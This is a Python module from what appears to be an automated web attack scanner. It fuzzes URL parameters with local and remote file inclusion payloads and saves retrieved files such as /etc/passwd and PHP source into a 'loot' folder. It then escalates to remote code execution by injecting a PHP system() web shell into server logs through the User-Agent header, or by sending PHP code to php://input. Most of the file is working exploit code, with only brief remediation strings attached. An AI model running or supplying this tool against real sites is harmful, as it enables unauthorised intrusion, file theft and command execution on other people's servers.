import aiohttp
import asyncio
import os
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    # PHP Wrappers
    "php://filter/convert.base64-encode/resource=index.php", # Base64 Loot
    "php://filter/read=string.rot13/resource=index.php",     # ROT13 Bypass
    "php://input",                                           # POST RCE
    "expect://id",                                           # Expect RCE (Rare)
    # RFI (Remote)
    "http://google.com/robots.txt",                          # Basic RFI Check
    #"http://127.0.0.1/shell.txt"                            # SSRF Context
]

LOG_PATHS = [
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/httpd/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/access.log"
]

# Directory to save stolen files
LOOT_DIR = os.path.join(os.getcwd(), "loot")
if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

def save_loot(host, filename, content):
    """ บันทึกไฟล์ที่ขโมยมาได้ลงเครื่อง """
    try:
        safe_host = re.sub(r'[^a-zA-Z0-9]', '_', host)
        safe_name = re.sub(r'[^a-zA-Z0-9\.]', '_', filename)
        
        # ตั้งชื่อไฟล์ให้ไม่ซ้ำ
        filepath = os.path.join(LOOT_DIR, f"{safe_host}_{safe_name}.txt")
        
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        return filepath
    except Exception:
        return "Failed to save locally"

async def check_rce_via_log_poisoning(session, parsed, param_name, original_payload):
    # ATTACK: Log Poisoning
    # 1. Inject Payload into User-Agent
    try:
        poison_payload = "<?php system($_GET['c']); ?>"
        root_url = f"{parsed.scheme}://{parsed.netloc}/"
        headers = {"User-Agent": poison_payload}
        
        # Determine injection point
        # Re-construct LFI URL but point to log file
        for log_path in LOG_PATHS:
            # First, trigger the log entry
            async with session.get(root_url, headers=headers, timeout=3, ssl=False) as r: pass
            
            # Now try to include the log file
            # Rebuild params
            params = parse_qs(parsed.query)
            params[param_name] = [log_path]
            # Add command execution param 'c'
            params['c'] = ['id'] 
            
            target_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
            
            async with session.get(target_url, timeout=5, ssl=False) as resp:
                text = await resp.text()
                if "uid=" in text and "gid=" in text:
                    return {
                        "path": log_path,
                        "output": text[:200]
                    }
    except Exception: pass
    return None

async def check_lfi(session, url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    host = parsed.netloc
    
    if not params: return findings

    for param_name in params:
        for payload in LFI_PAYLOADS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                # [LOGIC UPDATE] Special handling for 'php://input'
                if "php://input" in payload:
                    # Must send POST data with PHP code
                    rce_code = "<?php echo 'LOCKON_RCE_SUCCESS'; system('id'); ?>"
                    async with session.post(target_url, data=rce_code, timeout=5, ssl=False) as resp:
                         text = await resp.text()
                else:
                    # Normal GET LFI
                    async with session.get(target_url, timeout=5, ssl=False) as resp:
                        text = await resp.text()
                    
                evidence_found = False
                loot_path = ""
                
                # Check Linux
                if "root:x:0:0" in text:
                    evidence_found = True
                    loot_path = save_loot(host, "etc_passwd", text)
                    
                # Check Windows
                elif "[fonts]" in text and "[extensions]" in text:
                    evidence_found = True
                    loot_path = save_loot(host, "win.ini", text)

                # Check Expect RCE
                # Check Expect RCE
                elif "uid=" in text and "expect://" in payload:
                    findings.append({
                        "type": "Remote Code Execution (LFI - Expect Wrapper)",
                        "severity": "Critical",
                        "detail": "Successfully executed command via 'expect://id'.",
                        "evidence": f"Payload: {payload}\nOutput: {text[:100]}",
                        "remediation": "Disable allow_url_include and expect extension."
                    })
                    return findings

                # Check RFI (Google Robots)
                elif "User-agent: *" in text and "google.com" in payload:
                    findings.append({
                        "type": "Remote File Inclusion (RFI)",
                        "severity": "Critical",
                        "detail": "Application included a remote file from an external URL.",
                        "evidence": f"Payload: {payload}\nSnippet: {text[:100]}",
                        "remediation": "Disable allow_url_include."
                    })
                    return findings

                # Check php://input RCE
                # Check php://input RCE
                elif "LOCKON_RCE_SUCCESS" in text:
                    findings.append({
                        "type": "Remote Code Execution (LFI - php://input)",
                        "severity": "Critical",
                        "detail": "Successfully executed PHP code via POST body injection.",
                        "evidence": f"Payload: {payload}\nOutput: {text[:200]}",
                        "remediation": "Disable allow_url_include."
                    })
                    return findings
                    
                # Check PHP Source (Base64)
                elif "php://" in payload and "base64" in payload:
                    # Find base64 pattern
                    import base64
                    b64_candidates = re.findall(r'[a-zA-Z0-9+/=]{100,}', text)
                    for b64 in b64_candidates:
                        try:
                            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                            if "<?php" in decoded:
                                evidence_found = True
                                loot_path = save_loot(host, "source_code.php", decoded)
                                text = decoded[:500] + "\n...(Full source saved)" # Show preview only
                                break
                        except Exception: pass
                    if evidence_found: # If source code found, return immediately
                        findings.append({
                            "type": "Local File Inclusion (Source Code Disclosure)",
                            "severity": "High",
                            "detail": "Source code extracted via php://filter wrapper.",
                            "evidence": f"Payload: {payload}\nSaved Loot: {loot_path}",
                            "remediation": "Validate input paths."
                        })
                        return findings

                if evidence_found and "php://" not in payload:
                    # Escalation: Try RCE (Log Poisoning) for classic LFI
                    rce = await check_rce_via_log_poisoning(session, parsed, param_name, payload)
                    detail = f"Successfully read system file via '{param_name}'."
                    severity = "Critical"
                    rce_msg = ""
                    
                    if rce:
                        detail = f"ESCALATED to RCE via Log Poisoning at {rce['path']}"
                        rce_msg = f"\n[RCE PROOF - COMMAND: id]\n{rce['output']}"
                        
                    findings.append({
                        "type": "Local File Inclusion (LFI)" if not rce else "Remote Code Execution (LFI Chained)",
                        "severity": "Critical",
                        "detail": detail,
                        "evidence": f"Payload: {payload}\nSaved Loot: {loot_path}\n\n[CONTENT PREVIEW]\n{text[:300]}...{rce_msg}",
                        "remediation": "Validate input paths, disable allow_url_include."
                    })
                    return findings

            except Exception: pass
    return findings

async def run_lfi_scan(target_url, log_callback=None, headers=None):
    findings = []
    if log_callback: log_callback(f"📂 Testing LFI & Auto-Looting...")
    async with aiohttp.ClientSession(headers=headers) as session:
        findings = await check_lfi(session, target_url)
    return findings